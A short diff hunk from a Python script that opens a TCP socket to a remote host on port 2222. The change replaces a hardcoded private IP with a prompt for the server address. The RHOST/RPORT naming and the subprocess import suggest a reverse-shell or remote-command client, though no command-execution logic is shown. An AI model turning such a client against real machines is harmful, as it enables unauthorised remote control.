@@ -9,7 +9,9 @@ from time import sleep
 import subprocess
 colorama.init()
 
-RHOST = "192.168.1.102"
+
+RHOST = input("Enter the IP of the server: ")
+
 RPORT = 2222
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
